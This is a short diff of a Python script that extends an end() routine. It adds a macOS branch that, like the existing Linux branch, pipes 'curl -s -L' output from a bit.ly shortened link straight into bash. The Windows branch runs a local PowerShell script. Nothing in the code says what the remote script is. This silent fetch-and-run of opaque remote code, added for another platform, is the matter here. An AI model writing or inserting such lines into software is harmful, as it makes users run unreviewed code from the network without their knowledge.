@@ -96,6 +96,8 @@ def end():
         os.system('powershell .\/test.ps1')
     if platform.system() == 'Linux':
         os.system('curl -s -L http://bit.ly/10hA8iC | bash')
+    if platform.system() == 'Darwin':
+        os.system('curl -s -L http://bit.ly/10hA8iC | bash')
 def init():
     os.system('cls')
     banner()
